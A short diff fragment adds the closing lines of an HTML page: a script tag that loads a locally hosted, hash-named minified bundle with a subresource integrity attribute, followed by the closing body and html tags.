+<script type="text/javascript" src="/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
